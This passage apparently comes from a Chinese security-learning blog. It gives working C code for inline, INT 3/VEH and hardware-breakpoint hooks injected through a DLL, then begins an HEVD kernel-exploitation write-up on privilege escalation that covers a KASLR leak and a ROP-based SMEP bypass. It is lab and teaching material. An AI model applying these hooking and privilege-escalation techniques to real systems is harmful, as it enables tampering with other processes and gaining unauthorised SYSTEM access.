[RIP+offset]</span></span><br><span class="line">    g_PatchBytes[<span class="number">0</span>] = <span class="number">0xFF</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">1</span>] = <span class="number">0x25</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">2</span>] = <span class="number">0x00</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">3</span>] = <span class="number">0x00</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">4</span>] = <span class="number">0x00</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">5</span>] = <span class="number">0x00</span>;</span><br><span class="line">    <span class="comment">// 接下来的 8 个字节填入我们的函数 MyDispatchMessageW 的内存地址</span></span><br><span class="line">    *(ULONG_PTR*)(&amp;g_PatchBytes[<span class="number">6</span>]) = (ULONG_PTR)MyDispatchMessageW;</span><br><span class="line">    <span class="comment">// 3. 正式挂钩</span></span><br><span class="line">    InstallHook();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        InitHook(); </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        UninstallHook(); </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="热补丁-Hook-HotFix-Hook"><a href="#热补丁-Hook-HotFix-Hook" class="headerlink" title="热补丁 Hook (HotFix Hook)"></a>热补丁 Hook (HotFix Hook)</h3><p>它利用了 Windows API（主要在 32 位下）特有的函数头结构：</p><ol><li>函数开头是 2 字节的无用指令 <code>MOV EDI, EDI</code>。</li><li>函数上方有 5 字节的空白区 (<code>NOP</code> 或 <code>INT 3</code>)。<br>原理是将开头的 2 字节改为“短跳转（跳到上方）”，在上方写入“长跳转（跳到 Hook 函数）”。</li></ol><p>本质和Inline Hook都是更改函数入口处的机器码</p><h3 id="软件断点-Hook-Int-3-Hook"><a href="#软件断点-Hook-Int-3-Hook" class="headerlink" title="软件断点 Hook (Int 3 Hook)"></a>软件断点 Hook (Int 3 Hook)</h3><p>Int 3 Hook 利用 CPU 的异常处理机制。<br>它将目标函数的第一字节替换为 <code>0xCC</code> (汇编指令  <strong>INT 3</strong> )。当 CPU 执行到这里时，会暂停并抛出 <strong><code>EXCEPTION_BREAKPOINT</code></strong> 异常。通过注册异常处理程序（VEH），可以捕获这个异常并执行自定义逻辑。</p><p>中断hook都得关闭kernel debug：<code>bcdedit /debug off</code></p><h4 id="实现方法-4"><a href="#实现方法-4" class="headerlink" title="实现方法"></a>实现方法</h4><p><strong><code>AddVectoredExceptionHandler (VEH)</code></strong> ：注册一个全局异常处理函数，用来捕获 <code>0xCC</code> 触发的异常。相比 SEH，VEH 优先级更高且作用于全进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标函数指针</span></span><br><span class="line"><span class="type">void</span>* g_pTargetFunc = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 保存原始字节</span></span><br><span class="line">BYTE g_OriginalByte = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 标记是否已经 Hook</span></span><br><span class="line">BOOL g_bIsHooked = FALSE;</span><br><span class="line"><span class="comment">// 我们的处理逻辑</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyHookHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;INT 3 Hook Triggered via VEH!&quot;</span>, <span class="string">&quot;Hacked&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VEH 异常处理函数</span></span><br><span class="line">LONG WINAPI <span class="title function_">MyVEHHandler</span><span class="params">(PEXCEPTION_POINTERS pExceptionInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 判断是否是断点异常 (0x80000003) 且地址是我们 Hook 的地址</span></span><br><span class="line">    <span class="keyword">if</span> (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_BREAKPOINT &amp;&amp;</span><br><span class="line">        pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress == g_pTargetFunc) &#123;</span><br><span class="line">        <span class="comment">// 2. 执行我们的恶意逻辑</span></span><br><span class="line">        MyHookHandler();</span><br><span class="line">        <span class="comment">// 3 恢复原始字节 (去掉 0xCC)</span></span><br><span class="line">        DWORD dwOld;</span><br><span class="line">        VirtualProtect(g_pTargetFunc, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;dwOld);</span><br><span class="line">        <span class="built_in">memcpy</span>(g_pTargetFunc, &amp;g_OriginalByte, <span class="number">1</span>);</span><br><span class="line">        VirtualProtect(g_pTargetFunc, <span class="number">1</span>, dwOld, &amp;dwOld);  </span><br><span class="line">        <span class="comment">// 4.将EIP/RIP 指针倒退 1 个字节</span></span><br><span class="line">        <span class="comment">// 因为 CPU 执行了 INT 3 后，指令指针已经指向了下一个字节，我们需要退回去重新执行原指令</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">        pExceptionInfo-&gt;ContextRecord-&gt;Rip--;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        pExceptionInfo-&gt;ContextRecord-&gt;Eip--;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>   </span></span><br><span class="line">        <span class="comment">// 注意：这种简单的 Hook 是一次性的。</span></span><br><span class="line">        <span class="comment">// 如果想持续 Hook，需要在这里设置单步调试 (EFLAGS -&gt; TF位)，</span></span><br><span class="line">        <span class="comment">// 在单步异常中再次写入 0xCC。为简化代码，这里只演示触发一次。</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallInt3Hook</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hUser32 = GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    g_pTargetFunc = (<span class="type">void</span>*)GetProcAddress(hUser32, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_pTargetFunc) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 1. 注册全局向量化异常处理程序 (VEH)</span></span><br><span class="line">    <span class="comment">// 参数 1 表示添加到链表头部，优先处理</span></span><br><span class="line">    AddVectoredExceptionHandler(<span class="number">1</span>, MyVEHHandler);</span><br><span class="line">    <span class="comment">// 2. 备份原字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;g_OriginalByte, g_pTargetFunc, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 3. 写入 0xCC (INT 3)</span></span><br><span class="line">    DWORD dwOld;</span><br><span class="line">    VirtualProtect(g_pTargetFunc, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;dwOld);</span><br><span class="line">    *(BYTE*)g_pTargetFunc = <span class="number">0xCC</span>;</span><br><span class="line">    VirtualProtect(g_pTargetFunc, <span class="number">1</span>, dwOld, &amp;dwOld);</span><br><span class="line">    g_bIsHooked = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        InstallInt3Hook();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-5"><a href="#攻击效果-5" class="headerlink" title="攻击效果"></a>攻击效果</h4><p><img src="/image/2025-12-12-windows_dll_injection/1765856499390.png" alt="1765856499390"></p><h3 id="硬件断点-Hook-Hardware-Hook"><a href="#硬件断点-Hook-Hardware-Hook" class="headerlink" title="硬件断点 Hook (Hardware Hook)"></a>硬件断点 Hook (Hardware Hook)</h3><p>利用 CPU 自带的  <strong>调试寄存器 (Dr0 - Dr7)</strong> 。</p><p>一个CPU一般有8个调试寄存器（DR0 ~ DR7 寄存器），用于管理硬件断点</p><ul><li>DR0 ~DR3： 存储硬件断点地址。</li><li>DR4 和 DR5： 保留。</li><li>DR6：调试状态寄存器，用于向调试器报告事件的详细信息，以供调试器判断发生的是何种事件。</li><li>DR7：调试控制寄存器，用于定义断点的中断条件。</li></ul><p>这是一种 <strong>无损 Hook</strong> ，不需要修改内存中的任何代码或数据，因此能完美绕过内存完整性校验（CRC）。设置断点后，CPU 执行到指定地址会抛出 <strong><code>EXCEPTION_SINGLE_STEP</code></strong> 异常。</p><p>中断hook都得关闭kernel debug：<code>bcdedit /debug off</code></p><h4 id="实现方法-5"><a href="#实现方法-5" class="headerlink" title="实现方法"></a>实现方法</h4><ul><li><code>GetThreadContext</code> &#x2F; <code>SetThreadContext</code> ： 最关键 。这是应用层唯一能直接读写 CPU 寄存器（Dr0-Dr7）的接口。</li><li><code>SuspendThread</code> &#x2F; <code>ResumeThread</code> ：修改线程上下文前必须挂起线程，否则可能导致状态不一致或崩溃。</li><li><code>OpenThread</code> &#x2F; <code>CreateToolhelp32Snapshot</code> ：因为硬件断点是属于线程的（不是全局的），必须遍历并打开进程内的每一个线程分别设置。</li><li>设置寄存器 ：</li><li>Dr0 ：填入目标函数地址。</li><li>Dr7 ：控制位。启用 Dr0 (L0位)，并设置为“执行时触发”。</li><li>触发异常 ：CPU 运行到目标地址，触发 <code>EXCEPTION_SINGLE_STEP</code>。</li><li>VEH 捕获 ：检查 Dr6 寄存器，确认是否是由我们设置的断点触发的。</li><li>抗死锁机制 (Resume Flag) ：</li><li>不同于软件断点，这里不需要恢复内存（因为没改过内存）。</li><li>关键操作 ：设置 <code>EFLAGS</code> 寄存器的 RF (Resume Flag, 第16位) 为 1。</li><li>作用 ：告诉 CPU “请忽略下一条指令的断点”。如果没有这一步，CPU 会在同一行代码无限重复触发断点，导致死循环。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译命令: gcc -shared -o HardwareHook.dll HardwareHookFixed.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span> <span class="comment">// 需要用到快照遍历线程</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* g_pTargetFunc = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MyHookHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Hardware Hook Triggered via VEH!&quot;</span>, <span class="string">&quot;Hacked&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VEH 异常处理函数</span></span><br><span class="line">LONG WINAPI <span class="title function_">MyHwVEHHandler</span><span class="params">(PEXCEPTION_POINTERS pExceptionInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 硬件断点触发的是 EXCEPTION_SINGLE_STEP (0x80000004)</span></span><br><span class="line">    <span class="keyword">if</span> (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP) &#123;</span><br><span class="line">        <span class="comment">// 检查 DR6 的 B0 位 (Bit 0)，确认是否是 Dr0 触发的</span></span><br><span class="line">        <span class="keyword">if</span> (pExceptionInfo-&gt;ContextRecord-&gt;Dr6 &amp; <span class="number">0x1</span>) &#123;</span><br><span class="line">            <span class="comment">// 再次确认指令指针是否在目标地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">void</span>*)pExceptionInfo-&gt;ContextRecord-&gt;Rip == g_pTargetFunc)</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">void</span>*)pExceptionInfo-&gt;ContextRecord-&gt;Eip == g_pTargetFunc)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            &#123;</span><br><span class="line">                MyHookHandler();</span><br><span class="line">                <span class="comment">// [关键] 设置 Resume Flag (RF 位, EFLAGS 第 16 位)</span></span><br><span class="line">                <span class="comment">// 作用：告诉 CPU &quot;忽略下一条指令的调试断点&quot;</span></span><br><span class="line">                <span class="comment">// 这样程序继续执行时，不会立刻再次触发断点，执行完一条指令后 RF 自动清除</span></span><br><span class="line">                <span class="comment">// 从而完美避开死循环。</span></span><br><span class="line">                pExceptionInfo-&gt;ContextRecord-&gt;EFlags |= <span class="number">0x10000</span>;</span><br><span class="line">                <span class="comment">// 清除 DR6 状态，为下次做准备</span></span><br><span class="line">                pExceptionInfo-&gt;ContextRecord-&gt;Dr6 &amp;= ~<span class="number">0x1</span>;</span><br><span class="line">                <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 给单个线程设置硬件断点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetHardwareBreakpoint</span><span class="params">(DWORD dwThreadId, <span class="type">void</span>* address)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (dwThreadId == GetCurrentThreadId()) <span class="keyword">return</span>; <span class="comment">// 跳过当前注入线程</span></span><br><span class="line">    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);</span><br><span class="line">    <span class="keyword">if</span> (!hThread) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 必须挂起线程才能设置上下文</span></span><br><span class="line">    <span class="keyword">if</span> (SuspendThread(hThread) != (DWORD)<span class="number">-1</span>) &#123;</span><br><span class="line">        CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;</span><br><span class="line">        <span class="keyword">if</span> (GetThreadContext(hThread, &amp;ctx)) &#123;</span><br><span class="line">            <span class="comment">// 设置 DR0</span></span><br><span class="line">            ctx.Dr0 = (DWORD_PTR)address;</span><br><span class="line">            <span class="comment">// 清除 DR7 旧状态</span></span><br><span class="line">            ctx.Dr7 &amp;= ~(<span class="number">1</span> | <span class="number">2</span> | <span class="number">4</span> | <span class="number">8</span>);  </span><br><span class="line">            <span class="comment">// 设置 DR7: L0=1 (启用Dr0), RW0=00 (执行断点), LEN0=00 (1字节)</span></span><br><span class="line">            ctx.Dr7 |= <span class="number">1</span>; </span><br><span class="line">            SetThreadContext(hThread, &amp;ctx);</span><br><span class="line">        &#125;</span><br><span class="line">        ResumeThread(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 遍历当前进程的所有线程并设置断点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHwHookForAllThreads</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hUser32 = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    g_pTargetFunc = (<span class="type">void</span>*)GetProcAddress(hUser32, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_pTargetFunc) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 1. 注册 VEH</span></span><br><span class="line">    AddVectoredExceptionHandler(<span class="number">1</span>, MyHwVEHHandler);</span><br><span class="line">    <span class="comment">// 2. 遍历所有线程</span></span><br><span class="line">    DWORD dwCurrentPid = GetCurrentProcessId();</span><br><span class="line">    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        THREADENTRY32 te32;</span><br><span class="line">        te32.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line">        <span class="keyword">if</span> (Thread32First(hSnapshot, &amp;te32)) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="comment">// 只处理属于当前进程的线程</span></span><br><span class="line">                <span class="keyword">if</span> (te32.th32OwnerProcessID == dwCurrentPid) &#123;</span><br><span class="line">                    SetHardwareBreakpoint(te32.th32ThreadID, g_pTargetFunc);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (Thread32Next(hSnapshot, &amp;te32));</span><br><span class="line">        &#125;</span><br><span class="line">        CloseHandle(hSnapshot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        <span class="comment">// 使用新线程去执行安装，避免阻塞</span></span><br><span class="line">        CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)InstallHwHookForAllThreads, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-6"><a href="#攻击效果-6" class="headerlink" title="攻击效果"></a>攻击效果</h4><p><img src="/image/2025-12-12-windows_dll_injection/1765856651291.png" alt="1765856651291"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[HEVD]learning_windows_kernel</title>
      <link href="/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/"/>
      <url>/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows-kernel"><a href="#windows-kernel" class="headerlink" title="windows kernel"></a>windows kernel</h1><h2 id="HEVD–栈溢出漏洞实现提权-1"><a href="#HEVD–栈溢出漏洞实现提权-1" class="headerlink" title="HEVD–栈溢出漏洞实现提权-1"></a>HEVD–栈溢出漏洞实现提权-1</h2><h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h3><p>实验机器：windows 10 ltsc 2021 19044.6575 (Hyper-V 虚拟机)</p><p>最终目标：本地提权 (LPE) 至 <code>NT AUTHORITY\SYSTEM</code></p><p><img src="/image/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/1765094604279.png" alt="1765094604279"></p><h3 id="遇到的保护措施及绕过方案"><a href="#遇到的保护措施及绕过方案" class="headerlink" title="遇到的保护措施及绕过方案"></a>遇到的保护措施及绕过方案</h3><h4 id="1-KASLR-内核地址空间布局随机化"><a href="#1-KASLR-内核地址空间布局随机化" class="headerlink" title="1. KASLR (内核地址空间布局随机化)"></a>1. KASLR (内核地址空间布局随机化)</h4><ul><li><strong>原理</strong> ：系统启动时随机加载内核模块（如 <code>ntoskrnl.exe</code>）的基址，导致硬编码地址失效。</li><li><strong>绕过手段</strong> ： <strong>信息泄露 (Info Leak)</strong> 。</li><li><strong>实现</strong> ：利用 Windows API <code>EnumDeviceDrivers</code> 获取内核模块基址。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KASLR_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASLR_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// 自动链接 Psapi.lib，免去手动配置 VS 属性的麻烦</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">// 获取内核模块基址的辅助函数</span></span><br><span class="line"><span class="comment">// 使用 static 关键字防止在多个 .c 文件引用时出现重定义错误</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title function_">GetKernelModuleAddress</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* targetModuleName)</span> &#123;</span><br><span class="line">    LPVOID drivers[<span class="number">1024</span>];</span><br><span class="line">    DWORD cbNeeded;</span><br><span class="line">    <span class="type">int</span> cDrivers, i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> address = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 1. 获取所有驱动的加载地址列表</span></span><br><span class="line">    <span class="keyword">if</span> (EnumDeviceDrivers(drivers, <span class="keyword">sizeof</span>(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; <span class="keyword">sizeof</span>(drivers)) &#123;</span><br><span class="line">        cDrivers = cbNeeded / <span class="keyword">sizeof</span>(drivers[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// 2. 遍历列表，查找名字匹配的驱动</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cDrivers; i++) &#123;</span><br><span class="line">            <span class="type">char</span> szDriver[MAX_PATH];</span><br><span class="line">            <span class="comment">// 获取驱动的基础名称 (例如 ntoskrnl.exe)</span></span><br><span class="line">            <span class="keyword">if</span> (GetDeviceDriverBaseNameA(drivers[i], szDriver, <span class="keyword">sizeof</span>(szDriver) / <span class="keyword">sizeof</span>(szDriver[<span class="number">0</span>]))) &#123;</span><br><span class="line">                <span class="comment">// 不区分大小写比较</span></span><br><span class="line">                <span class="keyword">if</span> (_stricmp(szDriver, targetModuleName) == <span class="number">0</span>) &#123;</span><br><span class="line">                    address = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)drivers[i];</span><br><span class="line">                    <span class="comment">// 这里可以注释掉打印，以免干扰 EXP 的输出</span></span><br><span class="line">                    <span class="comment">// printf(&quot;[+] Found %s at address: 0x%llx\n&quot;, szDriver, address);</span></span><br><span class="line">                    <span class="keyword">break</span>; </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] EnumDeviceDrivers failed or buffer too small.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// KASLR_H</span></span></span><br></pre></td></tr></table></figure><h3 id="2-SMEP-Supervisor-Mode-Execution-Prevention"><a href="#2-SMEP-Supervisor-Mode-Execution-Prevention" class="headerlink" title="2. SMEP (Supervisor Mode Execution Prevention)"></a>2. SMEP (Supervisor Mode Execution Prevention)</h3><ul><li><strong>原理</strong> ：CR4 寄存器第 <strong>20</strong> 位置 1。禁止 Ring 0 (内核) 执行 Ring 3 (用户) 页面的代码。</li><li><strong>尝试过的手段</strong> ：ROP 修改 CR4 ( <code>mov cr4, rcx</code> )。</li><li><strong>局限性</strong> ：虽然关闭了硬件 SMEP，但无法绕过 KVAS。</li></ul><h3 id="3-KVAS-内核页表隔离-Kernel-Virtual-Address-Shadow"><a href="#3-KVAS-内核页表隔离-Kernel-Virtual-Address-Shadow" class="headerlink" title="3. KVAS (内核页表隔离 Kernel Virtual Address Shadow)"></a>3. KVAS (内核页表隔离 <strong>Kernel</strong> <strong>Virtual</strong> <strong>Address</strong> <strong>Shadow</strong>)</h3><ul><li><strong>原理</strong> 